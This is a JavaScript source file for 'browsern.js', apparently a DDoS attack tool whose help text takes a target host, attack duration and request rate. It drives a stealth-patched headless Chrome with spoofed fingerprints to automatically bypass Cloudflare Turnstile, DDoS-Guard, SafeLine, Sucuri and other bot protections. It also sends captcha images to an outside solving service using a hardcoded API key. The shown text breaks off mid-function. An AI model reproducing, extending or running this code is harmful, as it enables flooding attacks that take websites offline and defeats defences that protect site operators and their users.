const async = require("async");
const axios = require('axios');
const fs = require("fs")
const os = require('os');
const puppeteer = require("puppeteer-extra");
const puppeteerStealth = require("puppeteer-extra-plugin-stealth");
const anonymizeUA = require("puppeteer-extra-plugin-anonymize-ua")();
//const AdblockerPlugin = require('puppeteer-extra-plugin-adblocker');
const resemble = require('resemblejs');
const flood = require('./flood');
//const mouser = require('./mouser');

var HeadersBrowser = '';
let startTime = '';
const stealthPlugin = puppeteerStealth();
puppeteer.use(stealthPlugin);
puppeteer.use(anonymizeUA);
//puppeteer.use(AdblockerPlugin({ blockTrackers: true }));

if (process.argv.includes('-h') || process.argv.includes('--help')) {
  console.log(`
Usage: node browsern.js <host> <duration> <rates> [options]
Puppeteer runs a Chrome browser with stealth plugins.
Coded by @udpboy | Browsern v3.14

Arguments:
  <host>                 Target host (e.g., http://example.com)
  <duration>             Attack duration (seconds)
  <rates>                Requests rate per second

Options:
  --cuscaptcha <custom>      Custom captcha solving method (e.g., .button1) [default: none]
  --dratelimit <true/false>  Automating ratelimit detection [default: false]
  --fingerprint <type>       Fingerprint types (basic, advanced, undetect)  [default: none]
  --headers <type>           Extra headers types (basic, browser, undetect) [default: none]
  --headless <mode>          Headless mode (legacy, new, true/false) [default: new]
  --proxy <file>             Path to proxy list file (e.g., proxies.txt)
  -h, --help                 Display help and usage instructions

Bypasses:
  - Cloudflare UAM, Turnstile, Custom Page Turnstile,
  - Vercel Attack Challenge Mode
  - DDoS-Guard JS Challenge & Captcha,
  - SafeLine JS Challenge & Click Challenge.

Example:
  node browsern.js http://captcha.count123.org 120 4 --proxy proxies.txt
  `);
  process.exit(0);
}

if (process.argv.length < 5) {
    console.error("node browsern <duration> <rates> [options]");
    process.exit(1);
}

const host = process.argv[2];
const duration = process.argv[3];
const rates = process.argv[4];
const args = process.argv.slice(5);

const getArgValue = (name) => {
  const index = args.indexOf(name);
  return index !== -1 && args[index + 1] && !args[index + 1].startsWith('--') ? args[index + 1] : null;
};

const getArgFlag = (name) => args.includes(name);

const getArgValues = (name) => {
  const index = args.indexOf(name);
  if (index === -1) return [];
  
  const values = [];
  for (let i = index + 1; i < args.length; i++) {
    if (args[i].startsWith('--')) break;
    values.push(args[i]);
  }
  return values;
};

const cuscaptcha = getArgValue('--cuscaptcha');
const dratelimit = getArgFlag('--dratelimit');
const fingerprintArg = getArgValue('--fingerprint');
const headersArg = getArgValue('--headers');
const headlessArg = getArgValue('--headless');
const proxyFile = getArgValue('--proxy');

const fingerprints = ['basic', 'advanced', 'undetect'];
const headers_types = ['basic', 'browsers', 'undetect'];
const headlessModes = ['legacy', 'new', 'shell', 'true', 'false'];


if (fingerprintArg && !fingerprints.includes(fingerprintArg)) {
  console.error(`[INFO] Invalid fingerprint type(s): ${fingerprintArg}`);
  console.error(`[INFO] Fingerprint valid types: ${fingerprints.join(', ')}`);
  process.exit(1);
}

if (headersArg && !headers_types.includes(headersArg)) {
  console.error(`[INFO] Invalid headers type(s): ${headersArg}`);
  console.error(`[INFO] Headers alid types: ${headers_types.join(', ')}`);
  process.exit(1);
}
if (headlessArg && !headlessModes.includes(headlessArg)) {
  console.error(`[INFO] Invalid headless mode: ${headlessArg}`);
  console.error(`[INFO] Valid modes: ${headlessModes.join(', ')}`);
  process.exit(1);
}

const fingerprint = fingerprintArg || false;
const headers = headersArg || false;
const headless = headlessArg || 'new';

console.log('hai', cuscaptcha, dratelimit);

const userAgents = [
'Mozilla/5.0 (Linux; Android 10; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53',
/*'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53',
'Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53',
'Mozilla/5.0 (Linux; Android 10; ONEPLUS A6003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53',*/
/*'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edge/91.0.864.59',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36 Edg/116.0.1938.69',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36 Edg/116.0.1938.69',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.92 Safari/537.36 Edg/117.0.2045.31',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.89 Safari/537.36 Edg/118.0.2088.76',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36 Edg/115.0.1901.188',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36 Edg/114.0.1823.82',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.126 Safari/537.36 Edg/113.0.1774.57',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36 Edg/112.0.1722.64',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.148 Safari/537.36 Edg/111.0.1661.62',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.100 Safari/537.36 Edg/110.0.1587.57',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.100 Safari/537.36 Edg/119.0.2110.39',*/
];


const JSList = {
    "js": [{
        "name": "BlazingFast v1.0",
        "navigations": 1,
        "locate": "<br>DDoS Protection by</font> Blazingfast.io</a>"
    },
    {
        "name": "BlazingFast v2.0",
        "navigations": 1,
        "locate": "Verifying your browser, please wait...<br>DDoS Protection by</font> Blazingfast.io</a></h1>"
    },
    {
        "name": "Sucuri",
        "navigations": 4,
        "locate": "<html><title>You are being redirected...</title>"
    },
    {
        "name": "StackPath",
        "navigations": 4,
        "locate": "<title>Site verification</title>"
    },
    {
        "name": "StackPath EnforcedJS",
        "navigations": 4,
        "locate": "<title>StackPath</title>"
    },
    {
        "name": "Vercel JS Challenge",
        "navigations": 4,
        "locate": "<title>StackPath</title>"
    },
    {
        "name": "React",
        "navigations": 1,
        "locate": "Check your browser..."
    },
    {
        "name": "VShield",
        "navigations": 1,
        "locate": "<title>Captcha Challenge</title>"
    }]
}


/* 
    | Detection of protections on the site
*/
function JSDetection(argument) {
    for (let i = 0; i < JSList['js'].length; i++) {
        if (argument.includes(JSList['js'][i].locate)) {
            return JSList['js'][i]
        }
    }
}

//const startTime = Date.now();
const sleep = duration => new Promise(resolve => setTimeout(resolve, duration * 1000));
accept_header = ["text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7", 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9', "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9", 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9', "application/json, text/plain, */*", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9", 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8', "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"];


async function spoofFingerprint(page) {
    await page.evaluateOnNewDocument(() => {
        delete navigator.__proto__.webdriver;

        Object.defineProperty(window, 'screen', {
            value: {
                width: 1920,
                height: 1080,
                availWidth: 1920,
                availHeight: 1080,
                colorDepth: 24,
                pixelDepth: 24
            }
        });
        Object.defineProperty(window, 'chrome', { get: () => undefined });

        Object.defineProperty(navigator, 'plugins', {
            value: [{ description: 'Portable Document Format', filename: 'internal-pdf-viewer', length: 1, name: 'Chrome PDF Plugin' }]
        });
        Object.defineProperty(navigator, 'pdfViewerEnabled', {
            get: () => true,
        });

        Object.defineProperty(navigator, 'languages', {
            value: ['en-US', 'en']
        });

        Object.defineProperty(navigator, 'platform', {
            value: 'Win32'
        });

        Object.defineProperty(navigator, 'webdriver', {
            get: () => false,
        });

        Object.defineProperty(navigator, 'hardwareConcurrency', {
            value: 4
        });

        Object.defineProperty(navigator, 'deviceMemory', {
            value: 8
        });
        Object.defineProperty(window.Notification, 'permission', {
            get: () => 'granted',
        });
    });
}

async function CustomPageTurnstile(page) {
    let x;
    let y;
    const Turnstile = await page.$('.main-wrapper');
    await sleep(5);
    if (Turnstile) {
      try {
         console.log('[INFO] Detected protection ~ Custom Page Turnstile');

         const TurnstileBox = await Turnstile.boundingBox();
         x = TurnstileBox.x + TurnstileBox.width / 2;
         y = TurnstileBox.y + TurnstileBox.height / 2;
//         console.log(x, y);
         await page.mouse.click(x, y);
         console.log('[DEBUG] Mouse clicked on TurnstileBox');
         await page.screenshot({ path: 'sesudah.png', fullPage: true });
         await sleep(5);
      } catch (error) {
       console.log(`[ERROR] ${error}`);
      };
    } else {
     console.log('[INFO] Bypass Failed');
    };
};

async function JsChallenge(page) {
//    await sleep(3);
    const content = await page.content();
    fs.writeFileSync('page.html', content, 'utf-8')
    let x;
    let y;
    try {
       if ( content.includes("https://waf.chaitin.com/challenge/v2/challenge.css")) {
         await page.screenshot({ path: 'sebelum.png', fullPage: true });
         await page.mouse.move(650, 800, { steps: 18 });
         await page.mouse.move(400, 600, { steps: 15 });
         const captcha = await page.waitForSelector("#sl-check", { visible: true, timeout: 2000}).catch(() => null);
         if (captcha) {
           console.log(`[INFO] Detected protection ~ SafeLine Captcha`);
           const captchabox = await captcha.boundingBox();
           x = captchabox.x + captchabox.width / 2;
           y = captchabox.y + captchabox.height / 2;
            await page.mouse.click(x, y, { delay: Math.floor(Math.random() * 40)});
           await sleep(3);0
           await page.screenshot({ path: 'sesudah.png', fullPage: true });
         } else {
          console.log(`[INFO] Detected protection ~ SafeLine JS Challenge`);
          await page.screenshot({ path: 'sesudah.png', fullPage: true });
         };
       };
       if (content.includes("/.well-known/ddos-guard/js-challenge/index.js")) {
         console.log(`[INFO] Detected protection ~ DDoS-Guard JS Challenge`);
         await sleep(5);
       };

       if (content.includes("/.well-known/ddos-guard/ddg-captcha-page/index.js")) {
         console.log(`[INFO] Detected protection ~ DDoS-Guard Captcha`);
         await DDGCaptcha(page);
         await sleep(3);
       };

       if (content.includes("/_guard/html.js?js=click_html")) {
         console.log(`[INFO] Detected protection ~ DDoS-Guard Click Challenge`);
         const click = await page.waitForSelector('.main #access', { visible: true, timeout: 5000 }).catch(() => null);
         if (click) {
           await page.click('.main #access');
           await sleep(5);
         };
       };

    } catch (error) {
     console.log(`[ERROR] ${error}`);
    } finally {
     await sleep(2);
     return;
    };
};

async function detectChallenge(browser, page, client) {
    const content = await page.content() ;
    if (content.includes("challenge-platform")) {
        try {
//            await page.screenshot({ path: 'sebelum.png', fullPage: true });
            await sleep(6);
//            await mouser(page);
            await page.screenshot({ path: 'sebelum.png', fullPage: true });
//            await page.screenshot({ path: 'sesudah.png', fullPage: true });
            const clx = 533;
            const cly = 289;
            startTime = Date.now();
            await page.screenshot({ path: '01.png',
              clip: { x: 503, y: 225,
                   width: 307, height: 125,
              },
            });

            const image1 = fs.readFileSync('01.png');
            const image2 = fs.readFileSync('./ex/captcha.png');
            const compareImages = (image1, image2) => {
              return new Promise((resolve, reject) => {
                resemble(image1)
                 .compareTo(image2)
                 .ignoreColors()
                 .onComplete((result) => {
                  const misMatch = parseFloat(result.misMatchPercentage);
                  if (misMatch === 0) {
                    resolve(true);
                  } else {
                   CustomPageTurnstile(page);
                   resolve(false);
                   return;
                  }
                 });
              });
            };
            const shouldProceed = await compareImages(image1, image2);
            if (!shouldProceed) return;
            console.log('[INFO] Detected protection ~ Cloudflare Turnstile');
//            await sleep(0.5);
            await page.mouse.click(clx, cly, { delay: Math.floor(Math.random() * 40)});
/*            await sleep(0.2);
            await page.screenshot({ path: 'sesudah.png', fullPage: true });*/
//            await JsChallenge(page);
//            fs.writeFileSync('page.html', content, 'utf-8')
/*            const captchaWrapper = await page.$('.main-wrapper');
            const { x, y } = await captchaWrapper.boundingBox();
            console.log(x, y);
            await page.mouse.click(x + 20, y + 20);*/
            console.log('[DEBUG] Mouse clicked on TurnstileBox');
            await JsChallenge(page);
        } catch (error) {
            console.log(`[ERROR] ${error}`);
        } finally {
            await sleep(5);
//            await page.screenshot({ path: 'screenshot.png', fullPage: true });
            return;
        }
    }
}

async function DDGCaptcha(page) {
    let s = false;

    for (let j = 0; j < page.frames().length; j++) {
        const frame = page.frames()[j];
        const captchaStatt = await frame.evaluate(() => {
            if (
                document.querySelector("#ddg-challenge") &&
                document.querySelector("#ddg-challenge").getBoundingClientRect()
                    .height > 0
            ) {
                return true;
            }

            const captchaStatus = document.querySelector(".ddg-captcha__status");
            if (captchaStatus) {
                captchaStatus.click();
                return true;
            } else {
                return false;
            }
        });

        if (captchaStatt) {
            await sleep(3);

            const base64r = await frame.evaluate(async () => {
                const captchaImage = document.querySelector(
                    ".ddg-modal__captcha-image"
                );
                const getBase64StringFromDataURL = (dataURL) =>
                    dataURL.replace("data:", "").replace(/^.+,/, "");

                const width = captchaImage?.clientWidth;
                const height = captchaImage?.clientHeight;

                const canvas = document.createElement("canvas");
                canvas.width = width;
                canvas.height = height;

                canvas.getContext("2d").drawImage(captchaImage, 0, 0);
                const dataURL = canvas.toDataURL("image/jpeg", 0.5);
                const base64 = getBase64StringFromDataURL(dataURL);

                return base64;
            });

            if (base64r) {
                try {
                    console.log("[INFO] Detected protection ~ DDoS-Guard Captcha");
                    const response = await axios.post(
                        "https://api.nopecha.com/",
                        {
                            key: "g0lhe3gz24_RWC6JP3H",
                            type: "textcaptcha",
                            image_urls: [base64r],
                        },
                        {
                            headers: {
                                "Content-Type": "application/json",
                            },
                        }
                    );

                    const res = response.data;

                    const text = await new Promise((resCaptcha) => {
                        function get() {
                            axios.get("https://api.nopecha.com/", {
                                    params: {
                                        id: res.data,
                                        key: "g0lhe3gz24_RWC6JP3H",
                                    },
                                })
                                .then((res) => {
                                    if (res.data.error) {




	                                        setTimeout(get, 1000);
                                    } else {
                                        resCaptcha(res.data.data[0]);
                                    }
                                })
                                .catch((error) => { });
                        }
                        get();
                    });

                    s = text;

                    await frame.evaluate((text) => {
                        const captchaInput = document.querySelector(".ddg-modal__input");
                        const captchaSubmit = document.querySelector(".ddg-modal__submit");

                        captchaInput.value = text;
                        captchaSubmit.click();
                    }, text);
   
